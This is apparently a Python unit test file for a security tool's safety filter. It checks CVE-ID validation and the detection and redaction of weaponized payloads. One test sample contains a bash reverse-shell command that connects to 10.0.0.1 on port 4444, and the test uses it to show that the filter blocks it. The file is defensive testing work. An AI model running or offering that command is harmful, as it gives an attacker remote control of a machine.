from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from kavach.safety import enforce, redact, scan_for_weaponized, validate_cve_id  # noqa: E402


class SafetyTest(unittest.TestCase):
    def test_validate_cve_id(self) -> None:
        self.assertTrue(validate_cve_id("CVE-2021-44228"))
        self.assertTrue(validate_cve_id("cve-2014-0160"))
        self.assertFalse(validate_cve_id("2021-44228"))
        self.assertFalse(validate_cve_id("CVE-21-1"))

    def test_detects_weaponized_payloads(self) -> None:
        sample = "to exploit, run: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        self.assertTrue(scan_for_weaponized(sample))
        verdict = enforce(sample)
        self.assertFalse(verdict.allowed)
        self.assertIn("REDACTED", verdict.redacted_text)

    def test_benign_text_allowed(self) -> None:
        sample = "Untrusted input reaches a deserialization sink; upgrade to 2.17.1."
        self.assertEqual(scan_for_weaponized(sample), [])
        self.assertTrue(enforce(sample).allowed)

    def test_redact_is_idempotent_on_clean_text(self) -> None:
        clean = "Apply the vendor patch and add input validation."
        self.assertEqual(redact(clean), clean)


if __name__ == "__main__":
    unittest.main()
